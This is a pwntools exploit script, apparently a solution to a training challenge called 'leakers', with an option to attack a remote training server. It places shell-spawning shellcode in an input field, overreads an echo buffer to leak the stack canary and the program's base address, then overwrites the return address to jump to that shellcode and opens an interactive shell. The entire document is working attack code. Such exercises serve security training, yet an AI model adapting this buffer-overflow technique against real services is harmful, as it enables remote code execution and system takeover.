from pwn import *

CHALL_PATH = "./leakers"
CHALL = ELF(CHALL_PATH)

context.arch="amd64"

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./leakers")
        #put a breakpoint before the read()
        gdb.attach(c, """
        brva *12F9 
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("leakers.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./leakers")

name=asm(shellcraft.sh())
c.recvuntil(b'name?\n')
c.sendline(name)

payload=b'A' * (0x68 + 1)
c.recvuntil(b'Echo: ')
c.send(payload)

c.recvuntil(payload)
canary = u64(b'\x00' + c.recv(7))
print("Canary:", hex(canary))

payload = b'A' * (0x68 + 6*8)
c.recvuntil(b'Echo: ')
c.send(payload)

c.recvuntil(payload)
leak = c.recv(6).ljust(8, b'\x00')
CHALL.address = u64(leak) - CHALL.symbols["main"] #set the address so that symbols return the offset
print("ELF base:", hex(CHALL.address))
print("PS1 @:", hex(CHALL.symbols["ps1"]))

#overwrite return address (taking into account canary and frame pointer)
payload = b'A' * (0x68)
payload += p64(canary)
payload += p64(0) #frame pointer
payload += p64(CHALL.symbols["ps1"])

c.recvuntil(b'Echo: ')
c.send(payload)

c.interactive()






